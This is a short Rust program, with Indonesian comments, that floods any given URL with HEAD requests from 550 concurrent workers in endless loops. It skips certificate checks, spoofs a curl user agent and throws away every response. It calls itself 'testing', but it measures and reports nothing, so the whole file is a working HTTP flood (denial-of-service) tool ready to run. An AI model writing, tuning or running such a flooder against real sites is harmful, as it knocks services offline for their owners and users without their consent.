use reqwest::{Client, Method, Request, Url};
use std::env;
use std::process;
use std::sync::Arc;
use std::time::Duration;
use tokio::signal;
use tokio::sync::watch;

#[tokio::main]
async fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        eprintln!("Usage: {} <url>", args[0]);
        process::exit(1);
    }
    
    // Validasi URL sekali saja di awal
    let target_url = Url::parse(&args[1]).unwrap_or_else(|_| {
        eprintln!("URL tidak valid.");
        process::exit(1);
    });

    // Optimasi transportasi tingkat tinggi
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .http2_prior_knowledge()
        .pool_max_idle_per_host(5000)
        .pool_idle_timeout(Duration::from_secs(60))
        .timeout(Duration::from_secs(3))
        .tcp_nodelay(true) // Memaksa paket langsung dikirim (NoDelay) seperti Go
        .build()
        .unwrap();

    let client = Arc::new(client);

    // MEMBUAT TEMPLATE REQUEST DI LUAR LOOP (Sama persis seperti trik Go lu)
    let mut base_req = Request::new(Method::HEAD, target_url);
    base_req.headers_mut().insert(
        reqwest::header::USER_AGENT,
        reqwest::header::HeaderValue::from_static("curl/8.4.0"),
    );
    let shared_req = Arc::new(base_req);

    const WORKERS: usize = 550;
    let (tx, mut rx) = watch::channel(false);
    let mut handles = vec![];

    println!("[*] Memulai pengujian optimal dengan {} worker...", WORKERS);

    for _ in 0..WORKERS {
        let client_clone = Arc::clone(&client);
        let req_clone = Arc::clone(&shared_req);
        let mut rx_clone = rx.clone();

        let handle = tokio::spawn(async move {
            loop {
                if *rx_clone.borrow() {
                    break;
                }

                // Melakukan kloning instan terhadap objek request yang sudah jadi (Sangat ringan di memori)
                if let Some(request) = req_clone.try_clone() {
                    if let Ok(resp) = client_clone.execute(request).await {
                        std::mem::drop(resp);
                    }
                }
            }
        });
        handles.push(handle);
    }

    tokio::select! {
        _ = signal::ctrl_c() => {
            println!("\n[*] Menerima sinyal berhenti, mematikan worker...");
        }
    }

    let _ = tx.send(true);
    for handle in handles {
        let _ = handle.await;
    }

    println!("[*] Pengujian selesai.");
}
